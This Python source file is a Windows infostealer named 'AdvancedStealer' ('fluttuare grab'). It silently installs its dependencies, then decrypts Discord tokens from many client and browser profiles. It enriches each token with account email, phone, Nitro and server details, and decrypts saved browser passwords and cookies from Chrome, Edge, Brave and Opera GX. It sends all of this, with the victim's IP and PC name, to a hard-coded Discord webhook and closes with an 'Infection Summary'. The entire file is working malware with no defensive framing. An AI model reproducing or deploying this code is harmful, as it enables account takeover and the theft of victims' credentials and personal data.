import os
if os.name != "nt":
    exit()
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import sqlite3
import requests
import win32crypt
from Crypto.Cipher import AES
import shutil
import glob
from typing import List, Dict

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])

PATHS = {
    'Discord': os.getenv("APPDATA") + '\\discord',
    'Discord Canary': os.getenv("APPDATA") + '\\discordcanary',
    'Lightcord': os.getenv("APPDATA") + '\\Lightcord',
    'Discord PTB': os.getenv("APPDATA") + '\\discordptb',
    'Opera': os.getenv("APPDATA") + '\\Opera Software\\Opera Stable',
    'Opera GX': os.getenv("APPDATA") + '\\Opera Software\\Opera GX Stable',
    'Amigo': os.getenv("LOCALAPPDATA") + '\\Amigo\\User Data',
    'Torch': os.getenv("LOCALAPPDATA") + '\\Torch\\User Data',
    'Kometa': os.getenv("LOCALAPPDATA") + '\\Kometa\\User Data',
    'Orbitum': os.getenv("LOCALAPPDATA") + '\\Orbitum\\User Data',
    'CentBrowser': os.getenv("LOCALAPPDATA") + '\\CentBrowser\\User Data',
    '7Star': os.getenv("LOCALAPPDATA") + '\\7Star\\7Star\\User Data',
    'Sputnik': os.getenv("LOCALAPPDATA") + '\\Sputnik\\Sputnik\\User Data',
    'Vivaldi': os.getenv("LOCALAPPDATA") + '\\Vivaldi\\User Data\\Default',
    'Chrome SxS': os.getenv("LOCALAPPDATA") + '\\Google\\Chrome SxS\\User Data',
    'Chrome': os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default",
    'Epic Privacy Browser': os.getenv("LOCALAPPDATA") + '\\Epic Privacy Browser\\User Data',
    'Microsoft Edge': os.getenv("LOCALAPPDATA") + '\\Microsoft\\Edge\\User Data\\Default',
    'Uran': os.getenv("LOCALAPPDATA") + '\\uCozMedia\\Uran\\User Data\\Default',
    'Yandex': os.getenv("LOCALAPPDATA") + '\\Yandex\\YandexBrowser\\User Data\\Default',
    'Brave': os.getenv("LOCALAPPDATA") + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Iridium': os.getenv("LOCALAPPDATA") + '\\Iridium\\User Data\\Default'
}

def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})

    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    if not os.path.exists(path):
        return tokens

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    try:
        with open(path + "\\Local State", "r") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
            file.close()
        return key
    except:
        return None

def getip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
            return json.loads(response.read().decode()).get("ip")
    except:
        return "None"

class AdvancedStealer:
    def __init__(self):
        self.webhook_url = "https://canary.discord.com/api/webhooks/1420906443799793838/L4jrzp19UGxyvrBgCd9Mz_zYivxLgTOONK-0ptNIT0ywZ4k4ThycR22CuX36MGtAeyXA"
        self.browsers = {
            'Chrome': {
                'paths': [
                    os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
                ],
                'profiles': ['Default', 'Profile *']
            },
            'Microsoft Edge': {
                'paths': [
                    os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
                ],
                'profiles': ['Default', 'Profile *']
            },
            'Brave': {
                'paths': [
                    os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
                ],
                'profiles': ['Default', 'Profile *']
            },
            'Opera GX': {
                'paths': [
                    os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
                ],
                'profiles': ['']
            }
        }
        
    def run(self):
        self.detailed_discord_grabber()
        
        pc_name = os.getenv('USERNAME')
        all_passwords = self.get_all_browser_passwords()
        cookies = self.get_all_browser_cookies()
        
        self.send_passwords_cookies_embed(pc_name, all_passwords, cookies)
    
    def detailed_discord_grabber(self):
        checked = []

        for platform, path in PATHS.items():
            if not os.path.exists(path):
                continue

            for token in gettokens(path):
                token = token.replace("\\", "") if token.endswith("\\") else token

                try:
                    key_data = getkey(path)
                    if not key_data:
                        continue
                    
                    encrypted_key = base64.b64decode(key_data)[5:]
                    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    
                    encrypted_token = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
                    iv = encrypted_token[3:15]
                    payload = encrypted_token[15:]
                    
                    cipher = AES.new(key, AES.MODE_GCM, iv)
                    decrypted_token = cipher.decrypt(payload)[:-16].decode()
                    
                    if decrypted_token in checked:
                        continue
                    checked.append(decrypted_token)

                    res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(decrypted_token)))
                    if res.getcode() != 200:
                        continue
                    
                    res_json = json.loads(res.read().decode())

                    badges = ""
                    flags = res_json.get('flags', 0)
                    if flags == 64 or flags == 96:
                        badges += "Bravery "
                    if flags == 128 or flags == 160:
                        badges += "Brilliance "
                    if flags == 256 or flags == 288:
                        badges += "Balance "

                    guilds_info = ""
                    try:
                        params = urllib.parse.urlencode({"with_counts": True})
                        guilds_res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discord.com/api/v10/users/@me/guilds?{params}', headers=getheaders(decrypted_token))).read().decode())
                        guild_count = len(guilds_res)
                        
                        for guild in guilds_res[:5]: 
                            if guild.get('permissions', 0) & 8 or guild.get('permissions', 0) & 32:
                                guilds_info += f"\n- {guild.get('name', 'Unknown')} ({guild.get('approximate_member_count', 'N/A')} members)"
                    except:
                        guild_count = 0
                        guilds_info = "N/A"

                    nitro_info = "No"
                    boost_info = "No boosts"
                    try:
                        nitro_res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me/billing/subscriptions', headers=getheaders(decrypted_token))).read().decode())
                        if nitro_res:
                            nitro_info = "Yes"
                            boost_res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me/guilds/premium/subscription-slots', headers=getheaders(decrypted_token))).read().decode())
                            if boost_res:
                                boost_count = len([b for b in boost_res if datetime.datetime.strptime(b.get("cooldown_ends_at", "2000-01-01T00:00:00.000000+00:00"), "%Y-%m-%dT%H:%M:%S.%f%z") < datetime.datetime.now(datetime.timezone.utc)])
                                boost_info = f"{boost_count} boosts available"
                    except:
                        pass

                    embed = {
                        "title": f"🎯 Discord Token Found - {res_json.get('username', 'Unknown')}",
                        "color": 0x800080,
                        "fields": [
                            {"name": "👤 User", "value": f"{res_json.get('username', 'Unknown')}#{res_json.get('discriminator', '0000')}", "inline": True},
                            {"name": "🆔 ID", "value": res_json.get('id', 'Unknown'), "inline": True},
                            {"name": "📧 Email", "value": res_json.get('email', 'Not set'), "inline": True},
                            {"name": "📞 Phone", "value": res_json.get('phone', 'Not set'), "inline": True},
                            {"name": "🛡️ Badges", "value": badges if badges else "None", "inline": True},
                            {"name": "💰 Nitro", "value": nitro_info, "inline": True},
                            {"name": "🚀 Boosts", "value": boost_info, "inline": True},
                            {"name": "🌐 Servers", "value": f"{guild_count} servers", "inline": True},
                            {"name": "📍 Source", "value": platform, "inline": True},
                            {"name": "🔑 Token", "value": f"```{decrypted_token}```", "inline": False}
                        ],
                        "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{res_json.get('id', '')}/{res_json.get('avatar', '')}.png?size=1024"} if res_json.get('avatar') else {},
                        "footer": {"text": f"IP: {getip()} | PC: {os.getenv('COMPUTERNAME', 'Unknown')}"}
                    }

                    data = {"embeds": [embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
                    requests.post(self.webhook_url, json=data, timeout=30)

                except Exception as e:
                    continue
        
    def get_all_browser_passwords(self) -> Dict[str, List[Dict]]:
        all_passwords = {}
        
        for browser_name, browser_info in self.browsers.items():
            browser_passwords = []
            
            for base_path in browser_info['paths']:
                if os.path.exists(base_path):
                    for profile in browser_info['profiles']:
                        try:
                            if '*' in profile:
                                profile_dirs = glob.glob(os.path.join(base_path, profile))
                            else:
                                profile_dirs = [os.path.join(base_path, profile)]
                            
                            for profile_dir in profile_dirs:
                                if os.path.exists(profile_dir):
                                    passwords = self.get_browser_passwords(browser_name, profile_dir)
                                    if passwords:
                                        browser_passwords.extend(passwords)
                        
                        except Exception as e:
                            continue
            
            if browser_passwords:
                all_passwords[browser_name] = browser_passwords
        
        return all_passwords
    
    def get_browser_passwords(self, browser_name: str, profile_path: str) -> List[Dict]:
        passwords = []
        
        try:
            login_data_path = os.path.join(profile_path, 'Login Data')
            
            if os.path.exists(login_data_path):
                temp_file = os.path.join(os.getenv('TEMP'), f'{browser_name}_temp.db')
                
                try:
                    shutil.copy2(login_data_path, temp_file)
                except Exception as e:
                    return passwords
                
                try:
                    conn = sqlite3.connect(temp_file)
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                    for url, username, encrypted_password in cursor.fetchall():
                        try:
                            if encrypted_password:  
                                decrypted_password = self.decrypt_password(encrypted_password, browser_name, profile_path)
                                
                                if decrypted_password and decrypted_password != "Non decifrabile":
                                    passwords.append({
                                        'url': url or 'N/A',
                                        'username': username or 'N/A',
                                        'password': decrypted_password,
                                        'profile': os.path.basename(profile_path)
                                    })
                        
                        except Exception as e:
                            continue
                    
                    conn.close()
                
                except Exception as e:
                    pass
                
                finally:
                    try:
                        os.remove(temp_file)
                    except:
                        pass
        
        except Exception as e:
            pass
        
        return passwords
    
    def decrypt_password(self, encrypted_password: bytes, browser_name: str, profile_path: str) -> str:
        try:
            if not encrypted_password or len(encrypted_password) == 0:
                return ""
            
            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
                return self.decrypt_aes_password(encrypted_password, browser_name, profile_path)
            else:
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
                    if decrypted and decrypted[1]:
                        return decrypted[1].decode('utf-8', errors='ignore')
                except:
                    return "None"
        
        except Exception as e:
            return f"Errore: {str(e)}"
    
    def decrypt_aes_password(self, encrypted_password: bytes, browser_name: str, profile_path: str) -> str:
        try:
            local_state_path = self.find_local_state_file(browser_name, profile_path)
            
            if not local_state_path or not os.path.exists(local_state_path):
                return "Local State non trovato"
            
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            
            encrypted_key = encrypted_key[5:]
            
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)
            
            return decrypted[:-16].decode('utf-8', errors='ignore')
            
        except Exception as e:
            return f"Errore AES: {str(e)}"
    
    def find_local_state_file(self, browser_name: str, profile_path: str) -> str:
        local_state_paths = {
            'Chrome': os.path.join(os.path.dirname(profile_path), 'Local State'),
            'Microsoft Edge': os.path.join(os.path.dirname(profile_path), 'Local State'),
            'Brave': os.path.join(os.path.dirname(profile_path), 'Local State'),
            'Opera GX': os.path.join(profile_path, 'Local State')
        }
        
        path = local_state_paths.get(browser_name)
        if path and os.path.exists(path):
            return path
        
        fallback_paths = [
            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Local State'),
            os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
            os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Local State'),
        ]
        
        for fallback_path in fallback_paths:
            if os.path.exists(fallback_path):
                return fallback_path
        
        return None
    
    def get_all_browser_cookies(self) -> Dict[str, List[Dict]]:
        all_cookies = {}
        
        for browser_name, browser_info in self.browsers.items():
            browser_cookies = []
            
            for base_path in browser_info['paths']:
                if os.path.exists(base_path):
                    for profile in browser_info['profiles']:
                        try:
                            if '*' in profile:
                                profile_dirs = glob.glob(os.path.join(base_path, profile))
                            else:
                                profile_dirs = [os.path.join(base_path, profile)]
                            
                            for profile_dir in profile_dirs:
                                if os.path.exists(profile_dir):
                                    cookies = self.get_browser_cookies(browser_name, profile_dir)
                                    browser_cookies.extend(cookies)
                        
                        except:
                            continue
            
            if browser_cookies:
                all_cookies[browser_name] = browser_cookies
        
        return all_cookies
    
    def get_browser_cookies(self, browser_name: str, profile_path: str) -> List[Dict]:
        cookies = []
        
        try:
            cookies_path = os.path.join(profile_path, 'Cookies')
            
            if os.path.exists(cookies_path):
                temp_file = os.path.join(os.getenv('TEMP'), f'{browser_name}_cookies_temp.db')
                shutil.copy2(cookies_path, temp_file)
                
                conn = sqlite3.connect(temp_file)
                cursor = conn.cursor()
                
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%' OR name LIKE '%token%'")
                
                for host, name, encrypted_value in cursor.fetchall():
                    try:
                        if encrypted_value:
                            decrypted_value = self.decrypt_password(encrypted_value, browser_name, profile_path)
                            
                            cookies.append({
                                'host': host,
                                'name': name,
                                'value': decrypted_value,
                                'profile': os.path.basename(profile_path)
                            })
                    
                    except:
                        continue
                
                conn.close()
                os.remove(temp_file)
        
        except:
            pass
        
        return cookies
    
    def send_passwords_cookies_embed(self, pc_name: str, all_passwords: Dict, cookies: Dict):
        
        total_passwords = sum(len(passwords) for passwords in all_passwords.values())
        
        if total_passwords > 0:
            password_description = f"**Total passwords found: {total_passwords}**\n\n"
            
            for browser, passwords in all_passwords.items():
                if passwords:
                    password_description += f"**{browser}:** {len(passwords)} passwords\n"
                    for pwd in passwords:
                        url = pwd.get('url', 'N/A')
                        username = pwd.get('username', 'N/A')
                        password = pwd.get('password', 'N/A')
                        
                        url_display = url if len(url) <= 50 else url[:47] + "..."
                        username_display = username if len(username) <= 30 else username[:27] + "..."
                        password_display = password if len(password) <= 30 else password[:27] + "..."
                        
                        password_description += f"• **Sito:** `{url_display}`\n"
                        password_description += f"  **Mail/User:** `{username_display}`\n"
                        password_description += f"  **Password:** `{password_display}`\n\n"
            
            if len(password_description) > 4000:
                password_description = password_description[:3990] + "\n... (truncated)"
            
            password_embed = {
                "title": "🔐 Browser Passwords",
                "description": password_description,
                "color": 0x800080,
                "footer": {"text": f"PC: {pc_name} | IP: {getip()}"}
            }
            
            data = {"embeds": [password_embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
            requests.post(self.webhook_url, json=data, timeout=30)
        
        important_cookies_count = 0
        cookies_description = ""
        
        for browser, browser_cookies in cookies.items():
            important_cookies = [c for c in browser_cookies if any(domain in c['host'] for domain in 
                                ['google', 'facebook', 'twitter', 'github', 'amazon', 'microsoft', 'spotify', 'instagram'])]
            if important_cookies:
                important_cookies_count += len(important_cookies)
                cookies_description += f"**{browser}:** {len(important_cookies)} cookies\n"
        
        if important_cookies_count > 0:
            cookies_embed = {
                "title": "🍪 Browser Cookies",
                "description": f"**Total important cookies found: {important_cookies_count}**\n\n{cookies_description}",
                "color": 0x800080,
                "footer": {"text": f"PC: {pc_name}"}
            }
            
            data = {"embeds": [cookies_embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
            requests.post(self.webhook_url, json=data, timeout=30)
        
        summary_embed = {
            "title": "📊 Infection Summary",
            "description": f"**Successful infection completed!**\n\n**💻 PC Name:** {pc_name}\n**🌐 IP Address:** {getip()}\n**🔑 Passwords Found:** {total_passwords}\n**🍪 Important Cookies:** {important_cookies_count}",
            "color": 0x800080,
            "thumbnail": {"url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
        }
        
        data = {"embeds": [summary_embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
        requests.post(self.webhook_url, json=data, timeout=30)

if __name__ == "__main__":
    stealer = AdvancedStealer()
    stealer.run()